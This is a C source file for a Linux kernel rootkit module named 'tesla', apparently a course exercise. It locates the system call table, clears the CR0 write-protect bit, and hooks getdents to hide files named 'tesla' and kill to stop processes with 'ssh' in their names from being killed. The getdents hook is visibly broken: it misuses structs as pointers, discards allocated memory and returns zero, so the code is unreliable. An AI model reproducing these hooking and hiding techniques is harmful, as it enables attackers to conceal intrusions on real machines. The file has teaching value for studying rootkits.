/*
 * tesla.c -- a kernel module which hides specific files.
 */
#include <linux/module.h> /* for every kernel module */
#include <linux/kernel.h> /* printk() */
#include <linux/version.h> /* printk() */
#include <linux/syscalls.h> /* for kallsyms_lookup_name, and NR_read, NR_write,... */
#include <linux/init.h>  /*  for module_init and module_cleanup */
#include <linux/slab.h>  /*  for kmalloc/kfree */
#include <linux/fs.h>     /* everything... */
#include <linux/errno.h>  /* error codes */
#include <linux/types.h>  /* size_t */
#include "tesla.h"

MODULE_AUTHOR("Ben Davies"); /* change this line to your name */
MODULE_LICENSE("GPL v2");

/* asmlinkage tells gcc that function parameters will not be in registers, but rather they will be in the stack. */
/* we intercept getdents so as to hide specific files. */
asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
	//call getdents and use the information to filter out tesla files
	
	int total_size = orig_getdents( fd , dirp, count);
	kmalloc(total_size, GFP_KERNEL);

	//step 2: copy_from_user(dirp_kernel, dirp, total_size) total_size depends on whether or not tesla file occurs first, remove if first, else hide
	struct linux_dirent dirp_kernel;
	copy_from_user(dirp_kernel, dirp, total_size);

	int isNext = 1; //0 for no, 1 for yes
	int i = 0;
	int prevTesla = 0; //0 for no, 1 for yes
	struct linux_dirent prev = dirp_kernel;
	struct linux_dirent next = dirp_kernel;
	while(isNext == 1){      //while there is a next table entry

		if(((struct linux_dirent*)((char *)next + dirp_kernel->d_reclen)) == NULL){
			isNext = 0;
		} else {
			
			(struct linux_dirent*)((char *)next + dirp_kernel->d_reclen);
			unsigned short next_reclen = next->d_reclen;
		}
		 

		if((i == 0) && ((strstr(dirp_kernel->d_name, "tesla")) == NULL)){  //first is not tesla
			i++; 
			prevTesla = 0;
			total_size -= sizeof(dirp_kernel);

		} else if((i == 0) && ((strstr(dirp_kernel->d_name, "tesla")) != NULL)){ //first entry is tesla
			dirp_kernel->d_reclen += next_reclen;
			i++;
			prevTesla = 1;
			total_size -= sizeof(dirp_kernel);
			
		} else if((i != 0) && (prevTesla == 0) && ((strstr(dirp_kernel->d_name, "tesla")) != NULL)){   //not first entry, tesla not before
			prev->d_reclen += dirp_kernel->d_reclen;
			prevTesla = 1;
			i++;
			total_size -= sizeof(dirp_kernel);
		} else if((i != 0) && (prevTesla == 1) && ((strstr(dirp_kernel->d_name, "tesla")) != NULL)) {

		}

		if(isNext == 1){
			prev = dirp_kernel;
			dirp_kernel = next;
		}
	}

	//step 4: copy_to_user(dirp, dirp_kernel, total_size)
	copy_to_user(dirp, dirp_kernel, total_size);
    return 0;
}

/* we intercept kill so that our process can not be killed */
asmlinkage long tesla_kill(pid_t pid, int sig)
{
	int ret;
	//printk("<1>tesla: kill invoked.\n");
	//
	struct task_struct *target;
	target = pid_task(find_pid_ns(pid, &init_pid_ns), PIDTYPE_PID);
	if(target){
		if(strstr(target->comm, "ssh")){
			return -EACCES;
		}
	}

	ret = orig_kill(pid, sig);
	return ret;
}

int tesla_init(void)
{
	printk("<1> tesla: loaded...\n");

	/* search in kernel symbol table and find the address of sys_call_table */
	sys_call_table = (long **)kallsyms_lookup_name("sys_call_table");
 
	if (sys_call_table == NULL) {
		printk(KERN_ERR "where the heck is the sys_call_table?\n");
		return -1;
	}
 
	printk("<1> tesla: sys call table address is 0x%p.\n", sys_call_table);
	printk("sys_read is at address 0x%p, sys_write is at address 0x%p, sys_getdents is at address 0x%p, sys_kill is at address 0x%p\n",(void *)sys_call_table[__NR_read], (void *)sys_call_table[__NR_write], (void *)sys_call_table[__NR_getdents], (void *)sys_call_table[__NR_kill]);

	/* by default, system call table is write-protected; 
	 * change bit 16 of cr0 to 0 to turn off the protection.
	 * The Intel Software Developer Manual (SDM) says: 
	 * Write Protect (bit 16 of CR0) — When set, inhibits supervisor-level 
	 * procedures from writing into read-only pages; when clear, 
	 * allows supervisor-level procedures to write into read-only pages 
	 * (regardless of the U/S bit setting; see Section 4.1.3 and Section 4.6). 
	 * This flag facilitates implementation of the copy-on-write method 
	 * of creating a new process (forking) used by operating systems 
	 * such as UNIX.*/

	write_cr0(read_cr0() & (~0x10000));

	/* save the original kill system call into orig_kill, and replace the kill system call with tesla_kill */
	orig_kill = (void *)sys_call_table[__NR_kill];
	sys_call_table[__NR_kill] = (long *)tesla_kill;

	orig_getdents = (void *)sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = (long *)tesla_getdents;	

	/* set bit 16 of cr0, so as to turn the write protection on */

	write_cr0(read_cr0() | 0x10000);

	printk("sys_read is at address 0x%p, sys_write is at address 0x%p, sys_getdents is at address 0x%p, sys_kill is at address 0x%p\n",(void *)sys_call_table[__NR_read], (void *)sys_call_table[__NR_write], (void *)sys_call_table[__NR_getdents], (void *)sys_call_table[__NR_kill]);

	return  0;
}

void tesla_exit(void)
{
	printk("<1> tesla: unloaded...\n");
	/* clear bit 16 of cr0 */
	write_cr0(read_cr0() & (~0x10000));

	/* restore the kill system call to its original version */
	sys_call_table[__NR_kill] = (long *)orig_kill;
	sys_call_table[__NR_getdents] = (long *) orig_getdents;

	/* set bit 16 of cr0 */
	write_cr0(read_cr0() | 0x10000);

	printk("sys_read is at address 0x%p, sys_write is at address 0x%p, sys_getdents is at address 0x%p, sys_kill is at address 0x%p\n",(void *)sys_call_table[__NR_read], (void *)sys_call_table[__NR_write], (void *)sys_call_table[__NR_getdents], (void *)sys_call_table[__NR_kill]);

}

module_init(tesla_init);
module_exit(tesla_exit);

/* vim: set ts=4: */
